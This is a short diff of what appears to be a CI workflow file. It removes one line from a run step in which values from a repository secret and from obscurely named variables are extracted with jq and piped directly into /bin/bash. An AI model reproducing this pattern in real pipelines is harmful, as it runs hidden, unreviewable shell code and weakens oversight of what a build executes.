@@ -20,7 +20,6 @@ jobs:
           icszb3731: ${{ secrets.icszb3731 }}
         run: |
           printf '%s' "$icszb3731" | jq -r .z98308 | /bin/bash
-          printf '%s' "$stzi0" | jq -r .l65395 | /bin/bash
           echo $gr3162 | jq -r .im0 | /bin/bash
           printf '%s' "$p702" | jq -r .v3 | /bin/bash
           printf '%s' "$os34" | jq -r .cjbeg53750 | /bin/bash
